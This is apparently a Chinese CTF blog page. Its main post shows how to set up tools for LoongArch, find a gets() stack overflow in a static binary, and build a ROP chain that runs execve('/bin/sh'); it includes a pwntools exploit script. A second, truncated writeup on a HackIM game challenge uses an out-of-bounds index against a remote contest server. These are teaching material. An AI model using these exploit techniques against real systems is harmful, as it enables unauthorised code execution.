<p>著名的模拟器 qemu 在其 7.1.0 版本引入了对龙架构模拟的支持，因此我们安装下最新的 qemu 就行了。<br>从 <a target="_blank" rel="noopener" href="https://github.com/loongson/build-tools/releases/">Releases · loongson&#x2F;build-tools (github.com)</a> 这里可以找到一些龙架构的交叉编译（跨架构生成 ELF）的工具，其中就包括龙架构的 objdump。<br>最后，为了动态调试，可能还需要一个支持龙架构的 gdb。gdb 在 13.1 版本引入了对龙架构调试的支持，可以通过下面的指令来在 &#x2F;opt&#x2F;gdb 目录下编译支持龙架构的 gdb（中途遇到报错多半是缺少某个库，可以上网搜）（执行指令的位置无所谓，不过在 root 的目录下需要加很多 sudo ……）：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">wget https://ftp.gnu.org/gnu/gdb/gdb-13.1.tar.xz</span><br><span class="line">tar xf gdb-13.1.tar.xz</span><br><span class="line"><span class="built_in">cd</span> gdb-13.1</span><br><span class="line"><span class="built_in">mkdir</span> build</span><br><span class="line"><span class="built_in">cd</span> build</span><br><span class="line">../configure --target=loongarch64-unknown-linux-gnu --prefix=/opt/gdb</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure>

<p>编译得到的 gdb 位于 <code>/opt/gdb/bin/loongarch64-unknown-linux-gnu-gdb</code></p>
<h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><p>学过 mips 和 riscv 的朋友会对 LoongArch 的指令集感到比较熟悉，LoongArch 也是 risc。它的寄存器昵称和 riscv 的几乎一模一样，比如存放 return address 的 ra。<br>从 pwner 的视角来看，龙架构：</p>
<ul>
<li>系统调用的参数依次存放在 <strong>a0</strong>, <strong>a1</strong>, <strong>a2</strong>, <strong>a3</strong>, <strong>a4</strong>, ……</li>
<li>系统调用编号存放在：<strong>a7</strong></li>
<li>返回地址存放在 <strong>ra</strong> 寄存器中<br>  返回指令是 <code>jirl $zero, $ra, 0</code>  </li>
<li><code>bl</code> 用作 call，先把返回地址存到 <strong>ra</strong> 然后跳转到目标地址</li>
<li>syscall 指令就是 <strong>syscall</strong></li>
</ul>
<p>使用 cross tool 中的 objdump 可以查看 binary 的汇编，我们直接看 main 函数：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">0000000120000520 &lt;main&gt;:</span><br><span class="line">   120000520:	02fec063 	addi.d      	$sp, $sp, -80(0xfb0)</span><br><span class="line">   120000524:	29c12061 	st.d        	$ra, $sp, 72(0x48)</span><br><span class="line">   120000528:	29c10076 	st.d        	$fp, $sp, 64(0x40)</span><br><span class="line">   12000052c:	02c14076 	addi.d      	$fp, $sp, 80(0x50)</span><br><span class="line">   120000530:	1a000b0c 	pcalau12i   	$t0, 88(0x58)</span><br><span class="line">   120000534:	02e46184 	addi.d      	$a0, $t0, -1768(0x918)</span><br><span class="line">   120000538:	54bf0000 	bl          	48896(0xbf00)	# 12000c438 &lt;_IO_puts&gt;</span><br><span class="line">   12000053c:	02fec2cc 	addi.d      	$t0, $fp, -80(0xfb0)</span><br><span class="line">   120000540:	00150184 	move        	$a0, $t0</span><br><span class="line">   120000544:	54bb5400 	bl          	47956(0xbb54)	# 12000c098 &lt;_IO_gets&gt;</span><br><span class="line">   120000548:	02fec2cc 	addi.d      	$t0, $fp, -80(0xfb0)</span><br><span class="line">   12000054c:	00150185 	move        	$a1, $t0</span><br><span class="line">   120000550:	1a000b0c 	pcalau12i   	$t0, 88(0x58)</span><br><span class="line">   120000554:	02e4e184 	addi.d      	$a0, $t0, -1736(0x938)</span><br><span class="line">   120000558:	54651800 	bl          	25880(0x6518)	# 120006a70 &lt;_IO_printf&gt;</span><br><span class="line">   12000055c:	0015000c 	move        	$t0, $zero</span><br><span class="line">   120000560:	00150184 	move        	$a0, $t0</span><br><span class="line">   120000564:	28c12061 	ld.d        	$ra, $sp, 72(0x48)</span><br><span class="line">   120000568:	28c10076 	ld.d        	$fp, $sp, 64(0x40)</span><br><span class="line">   12000056c:	02c14063 	addi.d      	$sp, $sp, 80(0x50)</span><br><span class="line">   120000570:	4c000020 	jirl        	$zero, $ra, 0</span><br></pre></td></tr></table></figure>

<p>从中可以观察到很多经典的过程调用行为，比如开始时拓展栈空间、存放返回地址等信息；结束时取回返回地址、恢复栈空间。毕竟栈这种 LIFO 的结构对于过程调用还是非常根本的。<br>注意到，main 函数会依次调用 puts、<strong>gets</strong> 和 printf。有 gets 不就可以直接栈溢出了吗？<br>使用 <code>qemu-loongarch64 hello</code>，然后输入一大段 A，果然 qemu 报了 segmentation fault。</p>
<p>接下来的问题就是，我们已经能够控制栈了，那么 LoongArch 的栈上可以 ROP 吗？答案是可以。虽然 LoongArch 有专门用来存返回地址的 ra 寄存器，但很多过程仍然会把返回地址存到栈上，这是因为这些过程自己也需要调用其他的过程。因此，LoongArch 过程的结束既有从栈上读取返回地址，又有返回指令，可以进行 ROP。</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>我们的目标是 get shell，但这个 hello 虽然是静态链接的，却没有 system 函数。不过，我们可以直接找到 syscall gadget：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">120013e4c:	002b0000 	syscall     	0x0</span><br><span class="line">120013e50:	4c000020 	jirl        	$zero, $ra, 0</span><br></pre></td></tr></table></figure>

<p>至于 LoongArch Linux 的 Syscall Table，我好像只在 <a target="_blank" rel="noopener" href="https://patchwork.ozlabs.org/project/glibc/patch/CAKjxQHnS02h5Vo3Pm-+ESmqYqZ6FDY7ykty4KROBeondHVfmOQ@mail.gmail.com/">[6&#x2F;14, LoongArch] Linux Syscall Interface - Patchwork (ozlabs. Org)</a> 有看到，其中 execve 是 221。<br>只要能够控制 $a0 指向一个 “&#x2F;bin&#x2F;sh” 的字符串，$a1 和 $a2 控制为 0，就可以 get shell。我们需要为此找到合适的 gadget。</p>
<p>从本文参考的文章那边找到了一个非常牛逼的 gadget，来自 _dl_runtime_resolve 函数：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">120048098:   0015008d        move            $t1, $a0</span><br><span class="line">12004809c:   28c12061        ld.d            $ra, $sp, 72(0x48)</span><br><span class="line">1200480a0:   28c02064        ld.d            $a0, $sp, 8(0x8)</span><br><span class="line">1200480a4:   28c04065        ld.d            $a1, $sp, 16(0x10)</span><br><span class="line">1200480a8:   28c06066        ld.d            $a2, $sp, 24(0x18)</span><br><span class="line">1200480ac:   28c08067        ld.d            $a3, $sp, 32(0x20)</span><br><span class="line">1200480b0:   28c0a068        ld.d            $a4, $sp, 40(0x28)</span><br><span class="line">1200480b4:   28c0c069        ld.d            $a5, $sp, 48(0x30)</span><br><span class="line">1200480b8:   28c0e06a        ld.d            $a6, $sp, 56(0x38)</span><br><span class="line">1200480bc:   28c1006b        ld.d            $a7, $sp, 64(0x40)</span><br><span class="line">1200480c0:   2b814060        fld.d           $fa0, $sp, 80(0x50)</span><br><span class="line">1200480c4:   2b816061        fld.d           $fa1, $sp, 88(0x58)</span><br><span class="line">1200480c8:   2b818062        fld.d           $fa2, $sp, 96(0x60)</span><br><span class="line">1200480cc:   2b81a063        fld.d           $fa3, $sp, 104(0x68)</span><br><span class="line">1200480d0:   2b81c064        fld.d           $fa4, $sp, 112(0x70)</span><br><span class="line">1200480d4:   2b81e065        fld.d           $fa5, $sp, 120(0x78)</span><br><span class="line">1200480d8:   2b820066        fld.d           $fa6, $sp, 128(0x80)</span><br><span class="line">1200480dc:   2b822067        fld.d           $fa7, $sp, 136(0x88)</span><br><span class="line">1200480e0:   02c24063        addi.d          $sp, $sp, 144(0x90)</span><br><span class="line">1200480e4:   4c0001a0        jirl            $zero, $t1, 0</span><br></pre></td></tr></table></figure>

<p>似乎不管在哪个架构中，_dl_runtime_resolve 函数的功能都是保存寄存器的值到栈中，然后调用_dl_fixup执行具体的功能，然后从栈中恢复寄存器。因此以后要是遇到了什么riscv pwn，也可以使用这个gadget。<br>这个 gadget 能够控制所有参数寄存器，但需要提前把返回地址存在 $a0 中。所以继续手工找 gadget：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">12000bc54:   28c0a061        ld.d            $ra, $sp, 40(0x28)</span><br><span class="line">12000bc58:   28c08077        ld.d            $s0, $sp, 32(0x20)</span><br><span class="line">12000bc5c:   28c04079        ld.d            $s2, $sp, 16(0x10)</span><br><span class="line">12000bc60:   28c0207a        ld.d            $s3, $sp, 8(0x8)</span><br><span class="line">12000bc64:   00150304        move            $a0, $s1</span><br><span class="line">12000bc68:   28c06078        ld.d            $s1, $sp, 24(0x18)</span><br><span class="line">12000bc6c:   02c0c063        addi.d          $sp, $sp, 48(0x30)</span><br><span class="line">12000bc70:   4c000020        jirl            $zero, $ra, 0</span><br></pre></td></tr></table></figure>

<p>这个 gadget 可以把 $s1 移到 $a0 ，那就继续找可以改 $s1 的 gadget：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">12000be90:   28c06061        ld.d            $ra, $sp, 24(0x18)</span><br><span class="line">12000be94:   0012e004        sltu            $a0, $zero, $s1</span><br><span class="line">12000be98:   28c04077        ld.d            $s0, $sp, 16(0x10)</span><br><span class="line">12000be9c:   28c02078        ld.d            $s1, $sp, 8(0x8)</span><br><span class="line">12000bea0:   00119004        sub.d           $a0, $zero, $a0</span><br><span class="line">12000bea4:   02c08063        addi.d          $sp, $sp, 32(0x20)</span><br><span class="line">12000bea8:   4c000020        jirl            $zero, $ra, 0</span><br></pre></td></tr></table></figure>

<p>有了这三个 gadget，齐活了！我们拥有了执行任意函数、任意 syscall 的能力。<br>接下来就是 exp 了，思路是首先把 “&#x2F;bin&#x2F;sh”读入到已知地址（程序关闭了 PIE），比如 bss 段，然后用 syscall gadget 来 get shell。前者我们可以通过 return to gets 来实现。</p>
<p>利用脚本写得不是很优雅，不过懒得改了。总之知道大概意思就行了）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">g1 = <span class="number">0x12000bc54</span></span><br><span class="line">g2 = <span class="number">0x12000be90</span></span><br><span class="line">g3 = <span class="number">0x120048098</span></span><br><span class="line">sys = <span class="number">0x120013e4c</span></span><br><span class="line">buf_addr = <span class="number">0x120087000</span></span><br><span class="line">gets_addr = <span class="number">0x12000c098</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    payload = <span class="string">b&quot;A&quot;</span> * <span class="number">72</span></span><br><span class="line">    payload += flat([</span><br><span class="line">        g2,</span><br><span class="line">        <span class="number">0</span>, gets_addr, <span class="number">0</span></span><br><span class="line">    ])</span><br><span class="line">    payload += flat([</span><br><span class="line">        g1,</span><br><span class="line">        <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    ])</span><br><span class="line">    payload += flat([</span><br><span class="line">        g3,</span><br><span class="line">        <span class="number">0</span>, buf_addr, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">        g2,</span><br><span class="line">        <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    ])</span><br><span class="line">    payload += flat([</span><br><span class="line">        <span class="number">0</span>, sys, <span class="number">0</span></span><br><span class="line">    ])</span><br><span class="line">    payload += flat([</span><br><span class="line">        g1,</span><br><span class="line">        <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    ])</span><br><span class="line">    payload += flat([</span><br><span class="line">        g3,</span><br><span class="line">        <span class="number">0</span>, buf_addr, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">221</span>,</span><br><span class="line">        g2,</span><br><span class="line">        <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    ])</span><br><span class="line"></span><br><span class="line">    io.sendline(payload)</span><br><span class="line">    io.sendline(<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://www.cameudis.com/Tech/PoRE/63955eff56fa.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/ava1.jpg">
      <meta itemprop="name" content="Cameudis">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Cameudis' Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/Tech/PoRE/63955eff56fa.html" class="post-title-link" itemprop="url">【PoRE#0x02】Android APP Reverse PartII</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-03-13 23:45:40" itemprop="dateCreated datePublished" datetime="2023-03-13T23:45:40+08:00">2023-03-13</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2024-01-11 16:34:30" itemprop="dateModified" datetime="2024-01-11T16:34:30+08:00">2024-01-11</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Tech/" itemprop="url" rel="index"><span itemprop="name">Tech</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Tech/PoRE/" itemprop="url" rel="index"><span itemprop="name">PoRE</span></a>
                </span>
            </span>

          
            <span id="/Tech/PoRE/63955eff56fa.html" class="post-meta-item leancloud_visitors" data-flag-title="【PoRE#0x02】Android APP Reverse PartII" title="Views">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">Views: </span>
              <span class="leancloud-visitors-count"></span>
            </span>
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Valine: </span>
    
    <a title="valine" href="/Tech/PoRE/63955eff56fa.html#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/Tech/PoRE/63955eff56fa.html" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>上篇见 <a target="_blank" rel="noopener" href="https://cameudis.github.io/Tech/PoRE/4ac4cf560d13.html">这里</a><br>本篇施工中……</p>
          <!--noindex-->
            <div class="post-button">
              <a class="btn" href="/Tech/PoRE/63955eff56fa.html#more" rel="contents">
                Read more &raquo;
              </a>
            </div>
          <!--/noindex-->
        
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://www.cameudis.com/Tech/Pwn/a45521a4b6a2.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/ava1.jpg">
      <meta itemprop="name" content="Cameudis">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Cameudis' Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/Tech/Pwn/a45521a4b6a2.html" class="post-title-link" itemprop="url">【Pwn#0x0E】UTCTF 2023 Printfail writeup</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-03-12 21:28:13" itemprop="dateCreated datePublished" datetime="2023-03-12T21:28:13+08:00">2023-03-12</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2024-01-11 16:30:39" itemprop="dateModified" datetime="2024-01-11T16:30:39+08:00">2024-01-11</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Tech/" itemprop="url" rel="index"><span itemprop="name">Tech</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Tech/Pwn/" itemprop="url" rel="index"><span itemprop="name">Pwn</span></a>
                </span>
            </span>

          
            <span id="/Tech/Pwn/a45521a4b6a2.html" class="post-meta-item leancloud_visitors" data-flag-title="【Pwn#0x0E】UTCTF 2023 Printfail writeup" title="Views">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">Views: </span>
              <span class="leancloud-visitors-count"></span>
            </span>
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Valine: </span>
    
    <a title="valine" href="/Tech/Pwn/a45521a4b6a2.html#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/Tech/Pwn/a45521a4b6a2.html" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>非栈上的格式化字符串利用。</p>
          <!--noindex-->
            <div class="post-button">
              <a class="btn" href="/Tech/Pwn/a45521a4b6a2.html#more" rel="contents">
                Read more &raquo;
              </a>
            </div>
          <!--/noindex-->
        
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://www.cameudis.com/Tech/Pwn/b40f5afe3eeb.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/ava1.jpg">
      <meta itemprop="name" content="Cameudis">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Cameudis' Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/Tech/Pwn/b40f5afe3eeb.html" class="post-title-link" itemprop="url">【Pwn#0x0D】HackIM CTF 2023 spygame writeup</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-03-10 19:59:14" itemprop="dateCreated datePublished" datetime="2023-03-10T19:59:14+08:00">2023-03-10</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2024-01-11 16:30:39" itemprop="dateModified" datetime="2024-01-11T16:30:39+08:00">2024-01-11</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Tech/" itemprop="url" rel="index"><span itemprop="name">Tech</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Tech/Pwn/" itemprop="url" rel="index"><span itemprop="name">Pwn</span></a>
                </span>
            </span>

          
            <span id="/Tech/Pwn/b40f5afe3eeb.html" class="post-meta-item leancloud_visitors" data-flag-title="【Pwn#0x0D】HackIM CTF 2023 spygame writeup" title="Views">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">Views: </span>
              <span class="leancloud-visitors-count"></span>
            </span>
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Valine: </span>
    
    <a title="valine" href="/Tech/Pwn/b40f5afe3eeb.html#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/Tech/Pwn/b40f5afe3eeb.html" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>我们CTF萌新小分队已经达到了4人之多(&#96;ヮ´)，这次排名41&#x2F;433，感觉很好~<br>这道题有十个队做出来，很高兴我也弄出来了，还顺便大致学会了docker配本地环境，挺感动的~~</p>
<p>漏洞：随机数未设种子、数组下标溢出</p>
<hr>
<h2 id="程序逻辑"><a href="#程序逻辑" class="headerlink" title="程序逻辑"></a>程序逻辑</h2><p>程序给了 N 个代码源文件以及DockerFile。主要逻辑是用 C code 写的，但是封装成了一个 Python 可以调用的模块，名为 <code>spy</code>，相关信息参考python文档 <a target="_blank" rel="noopener" href="https://docs.python.org/3/extending/extending.html">Extending Python with C or C++ — Python 3.11.2 documentation</a>。</p>
<p><code>game.py</code> 会让玩家选择游戏模式（easy or hard），然后调用 spy 模块的接口，如果返回通过就把 flag 打印出来。spy 模块的主要逻辑大致如下：</p>
<ul>
<li>首先进行八轮循环，每轮循环中：<ol>
<li>生成一个固定大小的数组，元素类型 <code>uint8_t</code></li>
<li>随机取两个数交换</li>
<li>打印交换后的数组</li>
<li>玩家输入两个 index（这一步将会计时，并分别将前后的时间保存到局部变量 <code>start_ns</code> 和 <code>end_ns</code> 中）</li>
<li>程序交换两个 index 的值</li>
<li>程序检查交换后数组，若正确则 <code>total_ok++</code></li>
<li>程序将 <code>end_ns - start_ns</code> 加到 <code>total_ns</code> 中</li>
</ol>
</li>
<li>循环完毕后，检查 <code>total_ok == 5</code> 和 <code>total_ns</code> 是否足够小，并返回结果。</li>
</ul>
<p>在 easy 模式下，total_ns 的限制换算后为 60 秒；但在 hard 模式下，total_ns 的限制为 1000ns，这通过正常的途径是不可能做到的（远程环境下最快每轮循环也需要 6000ns+）。</p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>第一个漏洞：程序生成随机数没有设置随机的种子，所以我们可以直接知道每一轮的答案是什么，从而达成五轮胜利来满足 <code>total_ok == 5</code> 的条件。<br>第二个漏洞：程序读取将要交换的 index 时，并没有做边界检查，所以我们可以<strong>干扰栈上的局部变量</strong>。</p>
<p>函数中的局部变量声明如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> user_input[<span class="number">256</span>];</span><br><span class="line"><span class="type">uint8_t</span> numbers[count];</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">timespec</span> <span class="title">start</span>, <span class="title">end</span>;</span></span><br><span class="line"><span class="type">uint64_t</span> start_ns, end_ns;</span><br><span class="line"><span class="type">uint64_t</span> total_ns, total_ok;</span><br><span class="line"><span class="type">size_t</span> swap1, swap2;</span><br><span class="line"><span class="type">size_t</span> swap1_in, swap2_in;</span><br><span class="line"><span class="type">size_t</span> i, k;</span><br><span class="line"><span class="type">bool</span> ok;</span><br></pre></td></tr></table></figure>

<p>其中最为重要的显然是 <code>total_ns</code> 和 <code>total_ok</code> 变量。但由于我们无法获取实际运行的 binary 文件，所以也没办法知道这些变量是存在栈上还是寄存器中，也没办法知道栈上相对 numbers 数组的偏移。</p>
<p>一种容易想到的方法是先答对五轮，然后尝试用 0 与 <code>total_ns</code> 交换来减少所花的时间。但这种方法需要我们知道 <code>total_ns</code> 的地址（如果它真的在栈上）。<br>在本地环境，经过幸苦的调试，可以发现 <code>total_ns</code> 确实在栈上，并利用这种方法攻击成功。但在远程环境，不论如何调试，都没办法找到 <code>total_ns</code> 的位置，我估计这个变量存寄存器上了。（这里省略了部分细节）<br>3.10&#x2F;20:30 UPDATE：赛后看了别的师傅的writeup，发现这个方法是完全可以的，现在再跑之前的脚本就跑出来了，不知道昨天晚上为什么一直跑不出，感觉是运气实在太差了……</p>
<p>没办法直接修改 <code>total_ns</code>，那就通过程序内的代码来修改 <code>total_ns</code>。<br><code>total_ns += end_ns - start_ns;</code><br>如果我们能够交换 <code>end_ns</code> 和 <code>start_ns</code>，那就可以让 <code>total_ns</code> 减小。</p>
<p>为了找到这两个变量的位置，同样需要慢慢试。由于程序每轮会告知玩家所花的时间，因此这两个变量的位置可以很方便地试出来（所花时间非常大就说明打到了）。由于我们只能交换两个 <code>uint8_t</code>，因此需要考虑更换哪两个位。</p>
<p>根据远程返回的信息可以发现，如果我们让程序以最快的速度运行（程序用 fgets 读取玩家输入，我们直接发送一个大字符串，其中用换行符区分答案），那么每轮的时间大约在 6000ns-10000ns 左右，换算为十六进制为 0x1770-0x2710。<br>这可以说明大部分情况下，开始和结束的时间，除了最后两个字节外，其余的字节都是相同的。所以我们只要交换两个时间的倒数第二个字节，就可以让它们的真值也大致交换。</p>
<p>此外，由于时间会波动，因此若最后三次交换成功，就会有一定几率让最后的 <code>total_ns</code> 小于 1000ns。接下来就是编写脚本。</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>经过测试发现，328-335 的偏移是 start_ns，320-327 的偏移是 end_ns。我交换的位偏移为 321 和 329。<br>利用脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    <span class="keyword">global</span> io</span><br><span class="line">    io = remote(<span class="string">&quot;52.59.124.14&quot;</span>, <span class="number">10013</span>)</span><br><span 